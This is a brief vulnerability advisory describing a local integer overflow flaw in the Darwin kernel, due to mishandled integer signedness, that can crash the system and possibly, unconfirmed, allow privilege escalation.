Reportedly a local integer overflow vulnerability affects the Darwin Kernel. This issue is due to a failure of the affected to properly handle integer signedness.

An attacker may leverage this issue to cause the affected computer to crash, denying service to legitimate users. It has been speculated that this issue may also be leverage to escalate privileges, although this is unconfirmed.
